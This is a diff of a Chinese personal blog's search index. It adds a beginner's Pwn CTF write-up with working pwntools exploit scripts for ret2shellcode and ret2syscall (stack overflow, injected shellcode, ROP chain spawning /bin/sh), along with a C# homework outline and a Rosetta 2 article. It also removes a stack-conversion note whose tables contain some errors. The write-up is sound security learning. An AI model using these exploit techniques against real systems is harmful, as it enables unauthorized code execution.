-<th align="center">扫描到的元素</th>
-<th align="center">s2(栈底-&gt;栈顶)</th>
-<th align="center">s1(栈底-&gt;栈顶)</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">1</td>
-<td align="center">4</td>
-<td align="center">空</td>
-<td align="center">遇到操作数，压入s2</td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">1</td>
-<td align="center">+</td>
-<td align="center">s1栈为空，压入s1</td>
-</tr>
-<tr>
-<td align="center">（</td>
-<td align="center">1</td>
-<td align="center">+（</td>
-<td align="center">左括号，压入s1</td>
-</tr>
-<tr>
-<td align="center">（</td>
-<td align="center">1</td>
-<td align="center">+（（</td>
-<td align="center">左括号，压入s1</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">1 2</td>
-<td align="center">+（（</td>
-<td align="center">遇到操作数，压入s2</td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">1 2</td>
-<td align="center">+（（+</td>
-<td align="center">栈顶为（，压入s2</td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">1 2 3</td>
-<td align="center">+（（+</td>
-<td align="center">遇到操作数，压入s2</td>
-</tr>
-<tr>
-<td align="center">）</td>
-<td align="center">1 2 3 +</td>
-<td align="center">+（</td>
-<td align="center">遇到右括号，弹出+后遇到左括号，删除一对小括号</td>
-</tr>
-<tr>
-<td align="center">*</td>
-<td align="center">1 2 3 +</td>
-<td align="center">+（*</td>
-<td align="center">遇到操作符，压入s1</td>
-</tr>
-<tr>
-<td align="center">4</td>
-<td align="center">1 2 3 + 4</td>
-<td align="center">+（*</td>
-<td align="center">遇到操作数，压入s2</td>
-</tr>
-<tr>
-<td align="center">）</td>
-<td align="center">1 2 3 + 4 *</td>
-<td align="center">+</td>
-<td align="center">遇到右括号，弹出*后遇到左括号，删除一对小括号</td>
-</tr>
-<tr>
-<td align="center">-</td>
-<td align="center">1 2 3 + 4 * +</td>
-<td align="center">-</td>
-<td align="center">遇到操作符，优先级相等，弹出+后s1为空，此时将-压入 s1</td>
-</tr>
-<tr>
-<td align="center">5</td>
-<td align="center">1 2 3 + 4 * + 5</td>
-<td align="center">-</td>
-<td align="center">遇到操作数，压入s2</td>
-</tr>
-<tr>
-<td align="center">null</td>
-<td align="center">1 2 3 + 4 * + 5 -</td>
-<td align="center">空</td>
-<td align="center">解析完毕，弹出s1中符号并压入s2中</td>
-</tr>
-</tbody></table>
-<p>结果：1 2 3 + 4 * + 5</p>
-<p>这是理论上转化后缀码的步骤。</p>
-<p>优化后的程序为</p>
-<table>
-<thead>
-<tr>
-<th align="center">扫描到的元素</th>
-<th align="center">s2(栈底-&gt;栈顶)</th>
-<th align="center">s1（栈底-&gt;栈顶）</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">1</td>
-<td align="center">4</td>
-<td align="center">空</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">1</td>
-<td align="center">+</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">（</td>
-<td align="center">1</td>
-<td align="center">+（（</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">1 2</td>
-<td align="center">+（（</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">1 2</td>
-<td align="center">+（（+</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">1 2 3</td>
-<td align="center">+（（+</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">）</td>
-<td align="center">1 5</td>
-<td align="center">+（</td>
-<td align="center">将+压入s1，消除小括号，s2计算3 + 2</td>
-</tr>
-<tr>
-<td align="center">*</td>
-<td align="center">1 5</td>
-<td align="center">+（*</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">4</td>
-<td align="center">1 5 4</td>
-<td align="center">+（*</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">）</td>
-<td align="center">1 20</td>
-<td align="center">+</td>
-<td align="center">将*压入s1，消除小括号，是、s2计算 4 * 5</td>
-</tr>
-<tr>
-<td align="center">-</td>
-<td align="center">21</td>
-<td align="center">-</td>
-<td align="center">将+压入s2，计算20+1</td>
-</tr>
-<tr>
-<td align="center">5</td>
-<td align="center">21 5</td>
-<td align="center">-</td>
-<td align="center"></td>
-</tr>
-<tr>
-<td align="center">null</td>
-<td align="center">16</td>
-<td align="center"></td>
-<td align="center">将s1弹栈，压入s2</td>
-</tr>
-</tbody></table>
-<p>结果为16</p>
-<p>这个讲数据结构的笔记挺好的： <a href="https://zq99299.github.io/dsalg-tutorial/">数据结构与算法 系列教程（笔记）</a></p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pwn学习</title>
     <url>/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><blockquote>
@@ -885,18 +408,603 @@
       </tags>
   </entry>
   <entry>
-    <title>指令系统</title>
-    <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-zhiling1.png" alt="zhiling1"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling2.png" alt="zhiling2"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling3.png" alt="zhiling3"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling4.png" alt="zhiling4"></p>
+    <title>C艹基础（1）</title>
+    <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="信息系统开发（-NET）-第八章作业"><a href="#信息系统开发（-NET）-第八章作业" class="headerlink" title="信息系统开发（.NET）   第八章作业"></a>信息系统开发（.NET）   第八章作业</h1><h2 id="什么是类的继承？怎么定义派生类？"><a href="#什么是类的继承？怎么定义派生类？" class="headerlink" title="什么是类的继承？怎么定义派生类？"></a>什么是类的继承？怎么定义派生类？</h2><h2 id="简述创建派生类时，构造函数的调用。"><a href="#简述创建派生类时，构造函数的调用。" class="headerlink" title="简述创建派生类时，构造函数的调用。"></a>简述创建派生类时，构造函数的调用。</h2><h2 id="怎样定义基类虚方法，并在派生类中重写基类虚方法？"><a href="#怎样定义基类虚方法，并在派生类中重写基类虚方法？" class="headerlink" title="怎样定义基类虚方法，并在派生类中重写基类虚方法？"></a>怎样定义基类虚方法，并在派生类中重写基类虚方法？</h2><h2 id="抽象方法和虚方法有什么异同？"><a href="#抽象方法和虚方法有什么异同？" class="headerlink" title="抽象方法和虚方法有什么异同？"></a>抽象方法和虚方法有什么异同？</h2><h2 id="什么是抽象类？它有什么特点？它和接口有何异同？"><a href="#什么是抽象类？它有什么特点？它和接口有何异同？" class="headerlink" title="什么是抽象类？它有什么特点？它和接口有何异同？"></a>什么是抽象类？它有什么特点？它和接口有何异同？</h2><h2 id="简述通过委托来调用对象方法的基本过程。"><a href="#简述通过委托来调用对象方法的基本过程。" class="headerlink" title="简述通过委托来调用对象方法的基本过程。"></a>简述通过委托来调用对象方法的基本过程。</h2>]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>c#</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwn题解</title>
+    <url>/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="从0开始的Pwn生活"><a href="#从0开始的Pwn生活" class="headerlink" title="从0开始的Pwn生活"></a>从0开始的Pwn生活</h1><p>与其说是题解，不如说是萌新初次见面的哦哈呦</p>
+<h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><p>没得说，复习的时候再写</p>
+<p>更权威的查找后门函数方法：</p>
+<ol>
+<li>ctrl + F搜索 system</li>
+<li>shift + F12看有没有字符串 &#x2F;bin&#x2F;sh</li>
+</ol>
+<h1 id="Ret2ShellCode"><a href="#Ret2ShellCode" class="headerlink" title="Ret2ShellCode"></a>Ret2ShellCode</h1><h4 id="第一次的思路"><a href="#第一次的思路" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203338698.png" alt="image-20241124203338698">	</p>
+<p>保护 &#x3D;  ZERO</p>
+<p>32位</p>
+<h5 id="IDA下静态调试"><a href="#IDA下静态调试" class="headerlink" title="IDA下静态调试"></a>IDA下静态调试</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203655566.png" alt="image-20241124203655566"> </p>
+<p>setvbuf是清空缓冲区。简单来说就是说不要设置输入输出缓冲区，不然没满发不出去。</p>
+<p>这个gets很关键，基本判别是溢出解法。</p>
+<p>执行内容位把s的值赋给buf2</p>
+<p>让我们查看下buf2的位置</p>
+<p>​                                                                                                                                                                                                                                                                                                                                                                                             </p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124204040843.png" alt="image-20241124204040843">                                                                                                                                                                           </p>
+<p>bss区域是可执行的，只需要在这里覆盖上我们需要执行的代码就好了</p>
+<p>返回地址覆盖位这个bss的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213147737.png" alt="image-20241124213147737" style="zoom: 33%;">	
+
+<p>所以我猜测应该是覆盖strcpy的返回地址到buf2数组的地址，数组内容应该是&#x2F;bin&#x2F;sh对应的机器码</p>
+<p>payload &#x3D; 0x64+4的无效数据加上&#x2F;bin&#x2F;sh的机器码</p>
+<h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>s是一个局部变量，gets可以将任意长度的字符赋值给s。当输入过长时，一直向高地址溢出可能覆盖main函数的返回地址。所以溢出的栈帧应该是main函数的栈帧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213831067.png" alt="image-20241124213831067"> </p>
+<p>这里看到，距离ebp刚好是100字节。</p>
+<p>ebp指向的是栈底，紧随其后的就是previous ebp，再往后面就是return address了</p>
+<p>不过静态调试分析不一定正确，题目可能有灵活性。此时需要动态调试。动态才是真正的实践出真知。</p>
+<h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>gets输入后直接看栈内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124214947632.png" alt="image-20241124214947632"> </p>
+<p>首先第一行，esp。它的意思是，这里存的是一个指针，AAAA是这个指针存的内容</p>
+<p>AAAA实际的位置在cddc处</p>
+<p>向上查看寄存器ebp的值              </p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124215221005.png" alt="image-20241124215221005"> </p>
+<p>从eax到ebp就是应该填充的数组的值，然后再用4字节垃圾数据填充掉previous ebp，最后覆盖返回地址即可</p>
+<p><strong>结果地址差是108，并非100</strong>。这是为什么？</p>
+<h5 id="写攻击脚本"><a href="#写攻击脚本" class="headerlink" title="写攻击脚本"></a>写攻击脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ljust(int n,char c) 前方字节流不变，后方补充数据C直到到达n个字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124223816018.png" alt="image-20241124223816018"> </p>
+<p>这不对啊 :question:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241125105258338.png" alt="image-20241125105258338"> </p>
+<p>仔细一看，bss段竟然没有可执行权限。这和说好的不一样啊</p>
+<p>破案了，LInux内核问题，不用纠结这题就是这样做的。</p>
+<p>当然也可以用mprotect函数或者换到Ubuntu 18以下的版本</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>动态调试和静态分析的结果可能有区别，一切按照动态调试的来。所以找长度的时候出了错</p>
+<p>另外需要通过pwntools来生成shellcode的机器码</p>
+<h1 id="NewStarCTF-公开赛赛道-ret2shellcode"><a href="#NewStarCTF-公开赛赛道-ret2shellcode" class="headerlink" title="[NewStarCTF 公开赛赛道] ret2shellcode"></a>[NewStarCTF 公开赛赛道] ret2shellcode</h1><h4 id="第一次的思路-1"><a href="#第一次的思路-1" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126203800780.png" alt="image-20241126203800780">	</p>
+<p>没有Canary保护的话，将返回地址覆盖是可行的。应该还是传统栈溢出。</p>
+<p>注意是64位</p>
+<h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126200304228.png" alt="image-20241126200304228"> </p>
+<p>关键有三步，第一步有一个mmap函数（这是啥我不知道），第二步向buf数组<strong>标准输入</strong>0x100字节的数据，第三步向v4数组标准输入0x100字节的数据。ULL后缀目的是确保编译器正确解析该数字的类型。</p>
+<p><strong>read和gets的区别在于：</strong></p>
+<p><code>read</code>需要指定读取长度，可以避免缓冲区溢出；<code>gets</code>读取输入直到\n出现，会导致缓冲区溢出</p>
+<p><code>read</code>需要手动处理读取的字节并在缓冲区末尾添加\0形成字符串；<code>gets</code>自动在字符串末尾田间空字符\0形成字符串</p>
+<p>百度一下：<code>mmap</code> </p>
+<p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a></p>
+<p>**内存映射：**简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，同样，内核空间对这段区域的修改也直接反映用户空间。</p>
+<p><code>mmap</code>是一种<strong>内存映射文件的方法</strong>，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p>
+<p><strong>函数原型</strong>：<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
+<p>start：映射区的开始地址</p>
+<p>length：映射区的长度</p>
+<p>prot：期望的内存保护标志</p>
+<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享</p>
+<p>fd：有效的文件描述词</p>
+<p>offset：被映射对象内容的起点</p>
+<p>这个时候第一步就清楚了，即将buf映射到一个4096字节的内存，其起始地址为虚拟地址0x233000，且该内存空间<strong>可读可写可执行</strong>（省略了动态分析vmmap没发现有rwx段）</p>
+<p>找到可读可写可执行，思路一下子就清晰了，将shellcode通过buf数组映射到这个虚拟空间，然后通过v4覆盖返回地址，覆盖的返回地址恰好为这个映射区的起始地址。<del>对还是不对？</del></p>
+<p>那么第一次写入的数据就是shellcode &#x3D; asm(shellcraft.sh())</p>
+<p>第二次写入的数据便为(0x30+8)的垃圾数据加上p64(0x233000)</p>
+<p>发现一个小问题，这里会把 buf覆盖掉吗 （buf[]的首地址），覆盖了会有影响吗。</p>
+<h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">addr = <span class="number">0x233000</span></span><br><span class="line">payload = (<span class="number">0x30</span>+<span class="number">8</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0x233000</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126205924180.png" alt="image-20241126205924180">	</p>
+<p>卧槽，你浩锅，直接过了</p>
+<p>也是第一次没看提示解出来一道pwn题（抛开查了查mmap函数不谈）</p>
+<h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><h4 id="哈吉咩得"><a href="#哈吉咩得" class="headerlink" title="哈吉咩得"></a>哈吉咩得</h4><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143917697.png" alt="image-20241128143917697"> </p>
+<p>32位，无保护，栈溢出</p>
+<h5 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144009902.png" alt="image-20241128144009902"> </p>
+<p>通过v4数组覆盖main函数的返回地址</p>
+<p>其长度为0x64+4</p>
+<p>而且这次没有后门函数也不能注入shellcode。考虑ROP，系统调用</p>
+<h5 id="找到gadget地址"><a href="#找到gadget地址" class="headerlink" title="找到gadget地址"></a>找到gadget地址</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144400349.png" alt="image-20241128144400349"> </p>
+<p>首先想想&#x2F;bin&#x2F;sh得系统调用流程是什么</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144455036.png" alt="image-20241128144455036"> </p>
+<p>于是我们需要得分别有</p>
+<p><code>pop eax；ret</code>	地址0x080bb196</p>
+<p><code>pop ebx；ret</code>	地址0x0804838e</p>
+<p>关于ecx和edx应该需要清空一下的吧。但是这里如果pop，ret感觉很麻烦。但找不到xor，ret就算了</p>
+<p>所以</p>
+<p> <code>xor ecx，ecx；ret</code>   或者 pop ret	地址</p>
+<p><code>xor edx，edx；ret</code>  或者  pop ret</p>
+<p><code>int 0x80</code></p>
+<p>这些是我们需要的gadget。</p>
+<p>但事实上发现只有xor eax，eax，所以ecx，edx应该是不需要怎么管的。</p>
+<h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><p>pop的东东是栈顶元素，即esp指向的数。而v4数组在esp的上方。说明没办法通过v4来修改esp指向内容的值啊。</p>
+<p>那该怎么办。</p>
+<p>唐了，记住esp一直指向栈顶。</p>
+<h4 id="正确思路-1"><a href="#正确思路-1" class="headerlink" title="正确思路"></a>正确思路</h4><h5 id="寻找后门函数"><a href="#寻找后门函数" class="headerlink" title="寻找后门函数"></a>寻找后门函数</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128150557112.png" alt="image-20241128150557112"> </p>
+<p>尝试了两种方法（第一题），只找到了字符串（后门函数对应的参数），但没找到后门函数（system）。</p>
+<h5 id="找gadget"><a href="#找gadget" class="headerlink" title="找gadget"></a>找gadget</h5><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code>找到第一个gadget。其他以此类推</p>
+<p>ecx和edx其实第一次构建payload的时候无需在意。因为一般情况下这个时候ecx和edx为0。可以先试试看，如果有问题再说。</p>
+<p>这里找到两个gadget：</p>
+<p>0x080bb196 : pop eax ; ret</p>
+<p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p>
+<p>找不到的就替代。</p>
+<p>最后 0x08049421 : int 0x80</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128152855316.png" alt="image-20241128152855316"> </p>
+<p>从下到上得看</p>
+<h5 id="动态调试尝试覆盖原有返回地址"><a href="#动态调试尝试覆盖原有返回地址" class="headerlink" title="动态调试尝试覆盖原有返回地址"></a>动态调试尝试覆盖原有返回地址</h5><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101348955.png" alt="image-20241129101348955"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101419976.png" alt="image-20241129101419976"> </p>
+<p>这又是一道动态调试和静态分析结果不相同得一道题。结果需要注入（0x88-0x1c+4）的垃圾数据</p>
+<h5 id="构建payload，编写exp"><a href="#构建payload，编写exp" class="headerlink" title="构建payload，编写exp"></a>构建payload，编写exp</h5><p><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</p>
+<p><code>payload = flat([b&#39;A&#39;*(112),pop_eax_addr, 0xb , pop_edx_ecx_ebx_addr, 0 , 0 , 0x80be408, int80_addr])</code></p>
+<p>以下为exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">int80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>), pop_eax_addr , <span class="number">0xb</span>,pop_edx_ecx_ebx_addr, <span class="number">0</span>,<span class="number">0</span>,binsh, int80_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>64位下遵循传参规则：</p>
+<p>H(a, b, c, d, e, f, g, h);<br>a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9<br>h-&gt;8(%esp)<br>g-&gt;(%esp)<br>call H</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>苹果的罗塞塔石碑 —— Rosetta 2</title>
+    <url>/2024/11/09/Rosetta/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="ARM架构与x86架构"><a href="#ARM架构与x86架构" class="headerlink" title="ARM架构与x86架构"></a>ARM架构与x86架构</h2><p><strong>指令集架构（ISA</strong>）是计算机硬件与软件之间的接口规范，定义了处理器可以执行的基本指令（如算术运算、数据传输、控制转移等）、指令格式、寻址模式以及相关的寄存器和数据类型。简单来说，它就像是处理器的“语言”（<strong>CPU预定义的操作和计算</strong>），让程序员能够编写可以在特定架构上运行的软件，同时也帮助设计处理器的工程师理解如何实现这些指令（简化程序员的工作）。</p>
+<p>那如果要简化程序员的工作，这意味着微处理器的工作十分复杂。<del>甲方只需要提要求就好了，而乙方需要考虑的就多了。</del>那到底是应该简化程序员的工作，还是简化微处理器的工作？</p>
+<p>由此产生了两种想法：<strong>CISC</strong> 和 <strong>RISC</strong></p>
+<p><strong>x86</strong>：<strong>基于CISC的处理器架构</strong>，拥有非常丰富的指令集。一条指令可以完成整个计算（如乘法）或将一块数据直接从内存中的一个位置移动到另一个位置，并且这一系列复杂的操作可以在一个周期内完成。但这也意味着它需要更多的晶体管，从而会占用控件并消耗能量。</p>
+<p><strong>ARM</strong>：<strong>基于RISC的处理器架构</strong>，每条指令仅代表一个能耗较低的简单操作。这使得汇编语言程序员的工作变得更加复杂，但却简化了处理器的工作。利用RISC处理器和先进的RISC计算机，可以通过运行多条指令或通过将复杂工作推给编译器（而不是CPU内核）来执行复杂工作。</p>
+<p>两种CPU设计都具有高性能，但ARM设计往往侧重于更小巧的外形、电池使用时间、尺寸、免除散热要求和成本。</p>
+<p>具体可见 <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">指令系统 | Pocon’s Blog</a></p>
+<hr>
+<h2 id="Mac向Apple芯片迁移"><a href="#Mac向Apple芯片迁移" class="headerlink" title="Mac向Apple芯片迁移"></a>Mac向Apple芯片迁移</h2><p>在2020年6月22日的苹果全球开发者大会上，苹果公司CEO蒂姆·库克宣布将Mac电脑从英特尔的x86-64的处理器平台迁移至ARM64架构的Apple芯片（由苹果自行设计的处理器）。（在此之前也有过迁移经历）</p>
+<p>既然是两种不同的指令集架构，苹果是如何实现让Intel平台上开发的软件在ARM架构平台的Mac上顺利运行的呢？</p>
+<hr>
+<h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>在此之前，先让我讲讲另一种实现机制：<strong>通用二进制</strong></p>
+<p>通用二进制是一种将多个架构的代码打包在同一个可执行文件中的技术。（由于这些多平台可执行程序文件容量比原来要大，所以也称为<strong>胖二进制</strong>。）该文件包含针对不同架构的机器代码，操作系统在运行时根据硬件架构选择合适的代码段执行。</p>
+<p>换而言之，也就是提供多个翻译版本，选你看得懂的那个。</p>
+<blockquote>
+<p>[!WARNING]</p>
+<p>以下为个人见解</p>
+</blockquote>
+<p>制作和优化其应用的ARM版本需要时间。创建通用二进制文件需要对源代码进行修改和测试，因此开发的复杂性会大幅提升。为了提供更灵活使用的解决方案，在当时<strong>Rosetta</strong>成为主流，而通用二进制版本需要更长的时间来推广和普及。</p>
+<p>换而言之，两个国家的人（Intel和Silicon）说的是不同的语言，彼此听不懂对方的话，还好的是都是用嘴说，声音通过空气传播，别人也都是用耳朵听的。那么，中间有个翻译（Rosetta），可以把一种语言翻译成另外一种。</p>
+<p><strong>Rosetta</strong>：一种动态翻译工具。允许已经存在的Intel x86应用在Apple Silicon（ARM架构）上运行，而无需开发者重新编译或发布新的版本。这使得用户能够立即继续使用他们的旧软件，无缝过渡到新硬件上。</p>
+<p>苹果公司声称：那些重视用户互动而较少计算量的应用程序（比如word等文字处理器）是比较适合同归哦Rosetta编译的；而需要大计算量的程序，比如Photoshop需要另外的通用二进制版本。</p>
+<p><strong>Rosetta 2</strong>：Rosetta 2预装在使用Apple Silicon芯片的Mac电脑的操作系统上。它可以将AMD64指令进行翻译。与Rosetta不同的是，Rosetta 2在安装软件时会把Intel版本程序转化为ARM程序，加上Apple的处理器性能很高，因此即使需要大计算量的程序，通过  Rosetta 2编译也能流畅地执行。（Intel版本Mac操作系统上地应用程序）</p>
+<p>让我们（浅显的）深入探讨一下底层原因：</p>
+<ol>
+<li>尽管指令集不同，ARM和Intel底层架构有较高相似度（具体我不知道为啥）。x86指令集虽然复杂，但Rosetta 2只需要支持其中的子集，也就是用户态指令。并且两套指令都是小端存储。</li>
+<li>最大障碍是内存排序（内存一致性模型不一样），即两个CPU在内存中看到彼此修改的顺序不一样。所以苹果将Intel的内存排序添加到他们的CPU中<del>（这也太暴力了）</del>。在运行转换后的x86代码时，它们会通过一个后门开关切换CPU的模式以符合Intel的内存排序。</li>
+</ol>
+<p>参考链接：</p>
+<p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Mac向Apple芯片迁移 - 维基百科，自由的百科全书</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - 维基百科，自由的百科全书</a></p>
+<p><a href="https://www.v2ex.com/t/726640">哪位老哥能解释一下 Rosetta 的实现原理？ - V2EX</a></p>
+<p><a href="https://www.bilibili.com/opus/850506105874284549">【转】苹果的 Rosetta 2 的实现原理大概是怎样的？ - 哔哩哔哩</a></p>
